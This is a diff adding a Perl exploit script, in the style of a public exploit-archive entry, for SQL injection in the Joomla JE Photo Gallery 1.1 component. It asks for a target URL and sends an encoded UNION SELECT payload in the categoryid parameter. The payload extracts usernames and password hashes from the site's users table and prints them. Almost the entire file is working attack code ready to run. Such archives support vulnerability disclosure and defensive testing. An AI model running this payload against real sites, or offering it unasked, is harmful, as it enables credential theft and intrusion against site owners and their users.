@@ -1,0 +1,55 @@
+# Exploit Title: Joomla! Component JE Photo Gallery 1.1 - SQL Injection
+# Dork: N/A
+# Date: 2018-11-26
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://joomlaextensions.co.in
+# Software Link: http://joomlaextensions.co.in/download/1387375463_JE%20PhotoGallery%20(%20J-%203.0%20).zip
+# Version: 1.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+
+#!/usr/bin/perl -w
+
+sub clear{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear'); }
+clear();
+print "
+                                     ./
+                                   (o o)
+###############################oOOo-(-)-oOOo###############################
+        ______  _______ ___    _   __   _____ _______   ___________    _   __ 
+       /  _/ / / / ___//   |  / | / /  / ___// ____/ | / / ____/   |  / | / / 
+       / // /_/ /\__ \/ /| | /  |/ /   \__ \/ __/ /  |/ / /   / /| | /  |/ /
+     _/ // __  /___/ / ___ |/ /|  /   ___/ / /___/ /|  / /___/ ___ |/ /|  /
+    /___/_/ /_//____/_/  |_/_/ |_/   /____/_____/_/ |_/\____/_/  |_/_/ |_/
+  
+                                 WWW.IHSAN.NET                               
+                                       +                                     
+	   Joomla! Component JE Photo Gallery 1.1 - SQL Injection         
+############################################################################
+";
+
+use LWP::UserAgent;
+print "\nTarget:[http://site.com/path/]: ";
+chomp(my $target=<STDIN>);
+print "\n[!] Exploiting Progress...\n";
+print "\n";
+$UT="wizjk_users";
+$S="index.php?";
+$I="tmpl=component&option=com_jephotogallery&view=category&task=fetchimage&categoryid=";
+$E="%2d%32%39%20%55%4e%69%6f%6e%20%73%65%4c%45%43%54%20%28%53%45%4c%45%43%54%20%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%75%73%65%72%6e%61%6d%65%2c%30%78%33%61%2c%70%61%73%73%77%6f%72%64%29%20%46%52%4f%4d%20".$UT."%29%2c%30%2c%30%2c%30%2c%30%2c%30%2c%30%2c%30%2c%30%2c%4e%75%4c%4c%2c%30%2c%30%2d%2d%20%2d";
+$SIE = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$SIE->agent('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0');
+$host = $target . "".$S."".$I."".$E."";
+$res = $SIE->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content; if ($answer =~/{"id":"(.*?)"/){ 
+print "[+] Success !!!\n";
+print "\n[+] Detail : $1\n";
+print "\n";
+}
+else{print "\n[-]Not found.\n";
+}
